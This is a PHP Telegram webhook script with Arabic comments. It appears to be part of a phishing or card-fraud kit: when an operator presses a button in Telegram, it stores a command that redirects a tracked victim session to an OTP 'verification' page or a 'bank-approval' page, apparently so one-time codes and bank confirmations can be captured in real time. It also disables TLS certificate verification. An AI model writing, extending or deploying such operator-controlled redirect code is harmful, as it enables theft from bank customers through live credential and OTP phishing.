<?php
/**
 * webhook.php
 * لما تضغط الزر داخل تيليجرام (بدون متصفح)
 * يحفظ أمر التوجيه → العميل ينتقل من أي متصفح عبر poll.php
 */

error_reporting(0);
require __DIR__ . '/store.php';

$cfg = require __DIR__ . '/config.php';
$input = json_decode(file_get_contents('php://input'), true);

// سجل بسيط للتأكد أن الويبهوك يشتغل
@file_put_contents(__DIR__ . '/data/webhook_last.txt', date('c') . "\n" . substr(json_encode($input), 0, 2000), LOCK_EX);

if (!$input || empty($input['callback_query'])) {
    http_response_code(200);
    echo 'ok';
    exit;
}

$cb = $input['callback_query'];
$callbackId = isset($cb['id']) ? $cb['id'] : '';
$data = isset($cb['data']) ? $cb['data'] : '';

$parts = explode(':', $data, 2);
$action = isset($parts[0]) ? $parts[0] : '';
$sessionId = sid(isset($parts[1]) ? $parts[1] : '');

$redirect = null;
$replyText = 'تم';

if ($action === 'otp' && $sessionId !== '') {
    $redirect = 'verification';
    $replyText = 'تم التوجيه لصفحة الرمز ✅';
} elseif ($action === 'bank' && $sessionId !== '') {
    $redirect = 'bank-approval';
    $replyText = 'تم التوجيه لصفحة موافقة البنك ✅';
}

$saved = false;
if ($redirect && $sessionId !== '') {
    $saved = set_command($sessionId, $redirect);
    if (!$saved) {
        $replyText = 'فشل حفظ التوجيه — اجعل مجلد data قابل للكتابة';
    }
}

// رد داخل تيليجرام فقط (بدون فتح أي صفحة)
$token = $cfg['telegram_bot_token'];
$payload = json_encode([
    'callback_query_id' => $callbackId,
    'text' => $replyText,
    'show_alert' => false,
], JSON_UNESCAPED_UNICODE);

if (function_exists('curl_init')) {
    $ch = curl_init("https://api.telegram.org/bot{$token}/answerCallbackQuery");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => $payload,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 15,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

http_response_code(200);
echo 'ok';
